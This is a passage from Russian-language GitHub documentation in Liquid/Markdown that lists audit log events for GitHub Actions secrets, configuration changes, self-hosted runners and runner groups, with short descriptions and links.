| `environment.update_actions_secret` | Активируется при обновлении секрета в среде. Дополнительную информацию см. в разделе [Секреты среды](/actions/reference/environments#environment-secrets).
{% endif %}

{% ifversion fpt or ghes or ghec %}
### События для изменений конфигурации
| Действие | Описание
|------------------|-------------------
| `repo.actions_enabled` | Активируется при включении {% data variables.product.prodname_actions %} для репозитория. Можно просмотреть с помощью пользовательского интерфейса. Это событие не отображается при доступе к журналу аудита с помощью REST API. Дополнительные сведения см. в разделе [Использование REST API](#using-the-rest-api).
| `repo.update_actions_access_settings` | Активируется при изменении параметра для управления использованием вашего репозитория рабочими процессами {% data variables.product.prodname_actions %} в других репозиториях.
{% endif %}

### События для управления секретами
| Действие | Описание
|------------------|-------------------
| `org.create_actions_secret` | Активируется при создании секрета {% data variables.product.prodname_actions %} для организации. Дополнительные сведения см. в статье [Создание зашифрованных секретов для организации](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization).
| `org.remove_actions_secret` | Активируется при удалении секрета {% data variables.product.prodname_actions %}.
| `org.update_actions_secret` | Активируется при обновлении секрета {% data variables.product.prodname_actions %}.
| `repo.create_actions_secret ` | Активируется при создании секрета {% data variables.product.prodname_actions %} для репозитория. Дополнительные сведения см. в статье [Создание зашифрованных секретов для репозитория](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository).
| `repo.remove_actions_secret` | Активируется при удалении секрета {% data variables.product.prodname_actions %}.
| `repo.update_actions_secret` | Активируется при обновлении секрета {% data variables.product.prodname_actions %}.

### События для средств выполнения тестов локального размещения
| Действие | Описание
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | Активируется при регистрации нового локального средства выполнения тестов. Дополнительные сведения см. в статье [Добавление средства выполнения тестов локального размещения в организацию](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise).
| `enterprise.remove_self_hosted_runner` | Активируется при удалении средства выполнения тестов локального размещения.
| `enterprise.runner_group_runners_updated` | Активируется при обновлении списка участников группы средства выполнения. Дополнительные сведения см. в разделе [Настройка средств выполнения тестов локального размещения в группе для организации](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization).
| `enterprise.self_hosted_runner_online` | Активируется при запуске приложения средства выполнения. Можно просматривать только с помощью REST API; не отображается в пользовательском интерфейсе или экспорте JSON/CSV. Дополнительные сведения см. в разделе [Проверка статуса средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `enterprise.self_hosted_runner_offline` | Активируется при остановке приложения средства выполнения тестов. Можно просматривать только с помощью REST API; не отображается в пользовательском интерфейсе или экспорте JSON/CSV. Дополнительные сведения см. в разделе [Проверка статуса средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `enterprise.self_hosted_runner_updated` | Активируется при обновлении приложения средства выполнения тестов. Можно просмотреть с помощью REST API и пользовательского интерфейса. Это событие не включается при экспорте журнала аудита в виде данных JSON или CSV-файла. Дополнительные сведения см. в статье [О средствах выполнения тестов локального размещения](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners) и [Просмотр журнала аудита для вашей организации](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log).
| `org.register_self_hosted_runner` | Активируется при регистрации нового локального средства выполнения тестов. Дополнительные сведения см. в разделе [Добавление средства выполнения тестов локального размещения в организацию](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization).
| `org.remove_self_hosted_runner` | Активируется при удалении средства выполнения тестов локального размещения. Дополнительные сведения см. в статье [Удаление средства выполнения тестов из организации](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).
| `org.runner_group_runners_updated` | Активируется при обновлении списка участников группы средства выполнения тестов. Дополнительные сведения см. в разделе [Настройка локальных средств выполнения в группе для организации](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization).
| `org.runner_group_updated` | Активируется при изменении конфигурации группы средства выполнения тестов локального размещения. Дополнительные сведения см. в разделе [Изменение политики доступа для группы средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group).
| `org.self_hosted_runner_online` | Активируется при запуске приложения средства выполнения. Можно просматривать только с помощью REST API; не отображается в пользовательском интерфейсе или экспорте JSON/CSV. Дополнительные сведения см. в разделе [Проверка статуса средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `org.self_hosted_runner_offline` | Активируется при остановке приложения средства выполнения тестов. Можно просматривать только с помощью REST API; не отображается в пользовательском интерфейсе или экспорте JSON/CSV. Дополнительные сведения см. в разделе [Проверка статуса средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `org.self_hosted_runner_updated` | Активируется при обновлении приложения средства выполнения тестов. Можно просматривать с помощью REST API и пользовательского интерфейса; не отображается в экспорте JSON/CSV. Дополнительные сведения см. в статье "[Сведения о локально размещенных средствах выполнения](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."
| `repo.register_self_hosted_runner` | Активируется при регистрации нового локального средства выполнения тестов. Дополнительные сведения см. в разделе [Добавление средства выполнения тестов локального размещения в репозиторий](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository).
| `repo.remove_self_hosted_runner` | Активируется при удалении средства выполнения тестов локального размещения. Дополнительные сведения см. в разделе [Удаление средства выполнения тестов из репозитория](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository).
| `repo.self_hosted_runner_online` | Активируется при запуске приложения средства выполнения. Можно просматривать только с помощью REST API; не отображается в пользовательском интерфейсе или экспорте JSON/CSV. Дополнительные сведения см. в разделе [Проверка статуса средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `repo.self_hosted_runner_offline` | Активируется при остановке приложения средства выполнения тестов. Можно просматривать только с помощью REST API; не отображается в пользовательском интерфейсе или экспорте JSON/CSV. Дополнительные сведения см. в разделе [Проверка статуса средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner).
| `repo.self_hosted_runner_updated` | Активируется при обновлении приложения средства выполнения тестов. Можно просматривать с помощью REST API и пользовательского интерфейса; не отображается в экспорте JSON/CSV. Дополнительные сведения см. в статье "[Сведения о локально размещенных средствах выполнения](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."

### События для средств выполнения тестов локального размещения
| Действие | Описание
|------------------|-------------------
| `enterprise.runner_group_created` | Активируется при создании группы средства выполнения тестов локального размещения. Дополнительные сведения см. в статье [Создание группы средств выполнения тестов локального размещения для организации](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise).
| `enterprise.runner_group_removed` | Активируется при удалении группы средства выполнения тестов локального размещения. Дополнительные сведения см. в разделе [Удаление средства выполнения тестов локального размещения в группу](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group).
| `enterprise.runner_group_runner_removed` | Активируется при использовании REST API для удаления средства выполнения тестов локального размещения из группы.
| `enterprise.runner_group_runners_added` | Активируется при добавлении средства выполнения тестов локального размещения в группу. Дополнительные сведения см. в разделе [Перемещение локального средства выполнения в группу](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group).
| `enterprise.runner_group_updated` |Активируется при изменении конфигурации группы средства выполнения тестов локального размещения. Дополнительные сведения см. в разделе [Изменение политики доступа для группы средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group).
| `org.runner_group_created` | Активируется при создании группы средства выполнения тестов локального размещения. Дополнительные сведения см. в разделе [Создание группы средств выполнения тестов локального размещения для организации](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization).
| `org.runner_group_removed` | Активируется при удалении группы средства выполнения тестов локального размещения. Дополнительные сведения см. в разделе [Удаление средства выполнения тестов локального размещения в группу](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group).
| `org.runner_group_updated` | Активируется при изменении конфигурации группы средства выполнения тестов локального размещения. Дополнительные сведения см. в разделе [Изменение политики доступа для группы средства выполнения тестов локального размещения](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group).
| `org.runner_group_runners_added` | Активируется при добавлении средства выполнения тестов локального размещения в группу. Дополнительные сведения см. в разделе [Перемещение локального средства выполнения в группу](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group).
| `org.runner_group_runner_removed` | Активируется при использовании REST API для удаления средства выполнения тестов локального размещения из группы. Дополнительные сведения см. в разделе [Удаление группы средств выполнения тестов локального размещения для организации](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization).

### События для действий рабочего процесса

{% data reusables.actions.actions-audit-events-workflow %}
